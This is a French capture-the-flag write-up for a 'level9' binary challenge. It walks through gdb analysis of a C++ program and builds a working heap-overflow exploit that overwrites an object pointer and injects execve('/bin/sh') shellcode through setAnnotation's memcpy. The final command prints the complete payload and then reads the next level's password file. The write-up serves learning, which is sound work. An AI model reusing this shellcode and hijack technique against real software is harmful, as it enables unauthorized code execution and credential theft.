#level9

$ ./level9
$ ./level9 test
$ ./level9 test test

On remarque que le programme n'affiche rien.

Après une analyse avec gdb, on obtient les informations suivantes:

    N::N(int)
    N::setAnnotation(char*)
    N::operator+(N&)
    N::operator-(N&)
    main, C'est un programme en cpp qui n'appelle pas /bin/sh et ne recupère pas non plus le pass. Donc on va surement utilisé un shellcode.
    On va utiliser le memcpy sur argv[1] dans setAnnotation() pour faire appel au edx pour appeler le shellcode.

D'abord on récupère le offset:

> run 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'
> The program being debugged has been started already.
> Start it from the beginning? (y or n) y

Starting program: /home/user/level9/level9 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz'

Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()

> i r
> eax 0x62626262 1650614882
> ...

Donc on a eax a 62626262 -> bbbb donc le offset commence à 108.

Il nous faut l'adresse du buffer, donc on va mettre un breakpoint juste après le setAnnotation().

> b \*main+136
> Breakpoint 1 at 0x804867c
> run 'AAAA'
> Starting program: /home/user/level9/level9 'AAAA'

Breakpoint 1, 0x0804867c in main ()

> x $eax
> 0x804a00c: 0x41414141

Donc l'adresse du buffer est 0x804a00c. La valeur esp+0x10 va etre donc 0x804a00c mais vu qu'on va encore dereferencer, l'adresse va pointer au début du shellcode donc 0x804a00c + 4 = 0x804a010.

Notre commande finale est donc:
$ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" \* 76 + "\x0c\xa0\04\x08"')

$cat /home/user/bonus0/.pass
